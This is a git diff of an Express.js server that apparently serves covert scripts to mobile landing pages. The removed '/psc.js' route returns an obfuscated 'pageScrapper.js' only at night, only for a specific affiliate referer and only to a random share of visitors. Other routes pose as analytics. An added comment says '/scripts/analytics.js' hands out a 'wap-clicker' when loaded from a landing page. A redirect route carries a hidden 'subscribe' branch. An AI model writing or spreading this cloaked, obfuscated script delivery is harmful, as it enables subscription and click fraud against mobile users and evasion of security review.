@@ -188,102 +188,11 @@ app.get('/pages/html/:page', (req, res)=> {
     })
 })
 
-app.get('/psc.js', (req, res)=> {
-    const reqId = shortid.generate()
-    const ipAddress = getClientIp(req)
-
-    const obfuscatorOptions = {
-        compact: true,
-        stringArray: true,
-        rotateStringArray: true
-    }
-
-    req.log = log.child({req_id: reqId})
-    req.log.info({req, ip: ipAddress, eventType: 'psc-load', eventArgs: {page: req.query.page}})
-
-    const queryStringObjBuffer = Buffer.from(`var queryStringObj=${JSON.stringify({...req.query, _req_id: reqId})};\n`)
-
-    res.header('Access-Control-Allow-Origin', '*')
-    res.header('Content-Type', 'text/javascript')
-
-    // client caching prevention headers
-    res.header('Cache-Control', 'no-cache, no-store, pre-check=0, post-check=0, must-revalidate')
-    res.header('Pragma', 'no-cache')
-    res.header('Expires', 0)
-
-    // return res.send('')
-
-
-    return res.send(fs.readFileSync('./tempfile.js', 'utf8'))
-
-
-    const regionTime = moment().utcOffset('+0300').format('HH')
-
-    // disable the script between 07:00 - 22:00
-    if (regionTime > 6 && regionTime < 21) {
-        return res.send('')
-    }
-
-    if(!(/affid=VOL\b/.test(req.headers.referer)) || Math.random() > 0.3) {
-        return res.end('')
-    }
-
-    getFileBuffer('pageScrapper.js', `./pageScrapper.js`)
-    .then((bufferData)=> {
-        const bufferLength = bufferData.bufferLength + queryStringObjBuffer.length
-        const contentBuffer = Buffer.concat([queryStringObjBuffer, bufferData.buffer], bufferLength)
-
-        const obfuscatedContent = R.compose(
-            (content)=> JSObfuscator.obfuscate(content).getObfuscatedCode(),
-            (buffer)=> buffer.toString('utf8')
-        )(contentBuffer)
-
-        res.send(obfuscatedContent)
-    })
-    .catch((err)=> {
-        res.sendStatus(400)
-    })
-})
-
-app.get('/analytics/uk.js', (req, res)=> {
-    const reqId = shortid.generate()
-    const ipAddress = getClientIp(req)
-
-    req.log = log.child({req_id: reqId})
-    req.log.info({req, ip: ipAddress, eventType: 'analytics-uk-load', eventArgs: {page: req.query.page}})
-
-    const queryStringObjBuffer = Buffer.from(`var queryStringObj=${JSON.stringify({...req.query, _req_id: reqId})};\n`)
-
-    res.header('Access-Control-Allow-Origin', '*')
-    res.header('Content-Type', 'text/javascript')
-
-    // client caching prevention headers
-    res.header('Cache-Control', 'no-cache, no-store, pre-check=0, post-check=0, must-revalidate')
-    res.header('Pragma', 'no-cache')
-    res.header('Expires', 0)
-
-    return res.send('')
-})
-
-app.get('/analytics/nl.js', (req, res)=> {
-    const reqId = shortid.generate()
-    const ipAddress = getClientIp(req)
-
-    req.log = log.child({req_id: reqId})
-    req.log.info({req, ip: ipAddress, eventType: 'analytics-nl-load', eventArgs: {page: req.query.page}})
-
-    res.header('Access-Control-Allow-Origin', '*')
-    res.header('Content-Type', 'text/javascript')
-
-    // client caching prevention headers
-    res.header('Cache-Control', 'no-cache, no-store, pre-check=0, post-check=0, must-revalidate')
-    res.header('Pragma', 'no-cache')
-    res.header('Expires', 0)
-
-    return res.send(fs.readFileSync('./tempfile.js', 'utf8'))
-})
-
 app.get('/scripts/analytics.js', (req, res)=> {
+
+    // check if the refferer is present, and only then return the wap-clicker
+    // if not present (script is being accessed directly, not being loaded from a landingpage), just return the analytics code
+
     const reqId = shortid.generate()
     const ipAddress = getClientIp(req)
 
@@ -388,32 +297,6 @@ app.get('/tr/crazy-birds', (req, res)=> {
         </body>
         </html>
     `)
-})
-
-app.get('/es/orange/flamilingo_es', (req, res)=> {
-    const reqId = req.query._req_id || shortid.generate()
-    const ipAddress = getClientIp(req)
-
-    req.log = log.child({req_id: reqId})
-    req.log.info({req, ip: ipAddress, eventType: 'page-visit', eventArgs: {page: 'flamilingo_es'}})
-
-    const destinationUrl = `http://n.teletube.tv/es/tvclub?${querystring.stringify(req.query)}`
-
-    res.header('Cache-Control', 'no-cache, no-store, pre-check=0, post-check=0, must-revalidate')
-    res.header('Pragma', 'no-cache')
-    res.header('Expires', 0)
-
-    res.header('Content-Length', 0)
-
-    // dummy check
-    if(Math.random() > 0) {
-        res.header('Location', destinationUrl)
-    } else {
-        req.log.info({req, ip: ipAddress, eventType: 'redirect', eventArgs: {page: 'flamilingo_es', subscribe: true}})
-        res.header('Location', `${destinationUrl}&atmobirun=1`)
-    }
-
-    return res.status(302).end()
 })
 
 app.get("/", (req, res) => {
